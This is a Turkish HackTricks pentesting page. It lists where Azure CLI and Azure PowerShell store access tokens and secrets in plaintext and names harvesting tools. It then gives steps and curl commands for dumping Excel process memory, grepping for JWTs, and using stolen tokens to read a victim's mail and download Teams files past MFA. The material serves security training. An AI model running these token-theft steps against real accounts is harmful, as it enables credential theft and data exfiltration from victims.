# Az - Yerel Bulut Kimlik Bilgileri

{{#include ../../../banners/hacktricks-training.md}}

## Yerel Token Depolama ve Güvenlik Hususları

### Azure CLI (Komut Satırı Arayüzü)

Tokenlar ve hassas veriler Azure CLI tarafından yerel olarak depolanır, bu da güvenlik endişeleri doğurur:

1. **Erişim Tokenları**: `C:\Users\<username>\.Azure` konumundaki `accessTokens.json` içinde düz metin olarak saklanır.
2. **Abonelik Bilgileri**: Aynı dizinde bulunan `azureProfile.json`, abonelik detaylarını tutar.
3. **Log Dosyaları**: `.azure` içindeki `ErrorRecords` klasörü, maruz kalmış kimlik bilgileri içeren loglar barındırabilir, örneğin:
- Kimlik bilgileri gömülü olarak yürütülen komutlar.
- Tokenlar kullanılarak erişilen URL'ler, hassas bilgileri açığa çıkarabilir.

### Azure PowerShell

Azure PowerShell de tokenlar ve hassas verileri yerel olarak depolar:

1. **Erişim Tokenları**: `C:\Users\<username>\.Azure` konumundaki `TokenCache.dat`, erişim tokenlarını düz metin olarak saklar.
2. **Hizmet Prensibi Gizli Anahtarları**: Bunlar `AzureRmContext.json` içinde şifrelenmemiş olarak saklanır.
3. **Token Kaydetme Özelliği**: Kullanıcılar, yetkisiz erişimi önlemek için dikkatli bir şekilde kullanılmalıdır.

### Onları Bulmak için Otomatik Araçlar

- [**Winpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe)
- [**Get-AzurePasswords.ps1**](https://github.com/NetSPI/MicroBurst/blob/master/AzureRM/Get-AzurePasswords.ps1)

## Bellekteki Tokenlar

[**bu videoda**](https://www.youtube.com/watch?v=OHKZkXC4Duw) açıklandığı gibi, bulut ile senkronize olan bazı Microsoft yazılımları (Excel, Teams...) **erişim tokenlarını bellek içinde düz metin olarak saklayabilir**. Bu nedenle, sürecin **belleğini dökerek** ve **JWT tokenları için grep yaparak** kurbanın buluttaki çeşitli kaynaklarına MFA'yı atlayarak erişim sağlayabilirsiniz.

Adımlar:

1. EntraID kullanıcısıyla senkronize olan excel süreçlerini favori aracınızla dökün.
2. `string excel.dmp | grep 'eyJ0'` komutunu çalıştırın ve çıktıda birkaç token bulun.
3. Sizi en çok ilgilendiren tokenları bulun ve bunlar üzerinde araçlar çalıştırın:
```bash
# Check the identity of the token
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq

# Check the email (you need a token authorized in login.microsoftonline.com)
curl -s -H "Authorization: Bearer <token>" https://outlook.office.com/api/v2.0/me/messages | jq

# Download a file from Teams
## You need a token that can access graph.microsoft.com
## Then, find the <site_id> inside the memory and call
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/sites/<site_id>/drives | jq

## Then, list one drive
curl -s -H "Authorization: Bearer <token>" 'https://graph.microsoft.com/v1.0/sites/<site_id>/drives/<drive_id>' | jq

## Finally, download a file from that drive:
curl -o <filename_output> -L -H "Authorization: Bearer <token>" '<@microsoft.graph.downloadUrl>'
```
**Bu tür erişim jetonlarının diğer süreçlerin içinde de bulunabileceğini unutmayın.**

{{#include ../../../banners/hacktricks-training.md}}
